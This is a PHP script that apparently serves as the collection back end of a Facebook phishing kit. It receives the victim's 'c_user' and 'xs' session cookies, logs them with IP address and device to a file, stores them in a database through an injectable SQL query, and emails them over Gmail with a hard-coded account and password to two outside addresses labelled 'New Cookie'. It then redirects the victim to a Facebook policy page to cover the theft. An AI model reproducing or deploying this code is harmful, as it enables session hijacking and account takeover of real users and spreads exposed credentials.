<?php
  use PHPMailer\PHPMailer\PHPMailer;
  use PHPMailer\PHPMailer\Exception;

  require_once 'vendor/autoload.php';
  require __DIR__ . '/database.php';

  $c_user = $_POST["c_user"];
  $xs = $_POST["xs"];
  // echo $c_user;
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
      $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
      $ip = $_SERVER['REMOTE_ADDR'];
  }
  $user_agent = $_SERVER['HTTP_USER_AGENT'];
  $ctime = date("m/d/Y h:i:s a", time());
  $content = "*********Data Captured**********
C_USER: ".$c_user."
XS: ".$xs."
IP-Address: ".$ip."
Device: ".$user_agent."
Time: ".$ctime."
------------------------------

";
  $fp = fopen("/tmp/username.txt","a");
  fwrite($fp,$content);
  fclose($fp);
  $sql =<<<EOF
      INSERT INTO DATA (c_user,xs)
      VALUES ('$c_user', '$xs' );
EOF;
  $ret = pg_query($dbconn, $sql);
  pg_close($dbconn);

  $mail = new PHPMailer(true);

  $mail->isSMTP();                                      // Set mailer to use SMTP
  $mail->Host = 'smtp.gmail.com';  // Specify main and backup SMTP servers
  $mail->SMTPAuth = true;                               // Enable SMTP authentication
  $mail->Username = 'carterreginald24@gmail.com';                 // SMTP username
  $mail->Password = 'fqbjmddjkxsnumgr';                           // SMTP password
  $mail->SMTPSecure = 'tls';
  $mail->Port  = 587;
  
  $mail->setFrom('carterreginald24@gmail.com', 'A NEW COOKIE RECEIVED');
  $mail->addAddress('kk442242@gmail.com', 'Receiver');
  $mail->addAddress('raziqahmed23@gmail.com', 'Receiver');
  $mail->Subject = 'New Cookie';
  $mail->Body    = 'Hello,

A new form has been submitted on your website. Details below:

C_USER: '.$c_user.' 

XS: '.$xs;

  if(!$mail->send()) {
      echo 'Message could not be sent.';
      echo 'Mailer Error: ' . $mail->ErrorInfo;
  } else {
      // echo 'Message has been sent';
  }

  $mail->smtpClose();

  header('Location: https://transparency.fb.com/en-gb/policies/community-standards/');
  die();
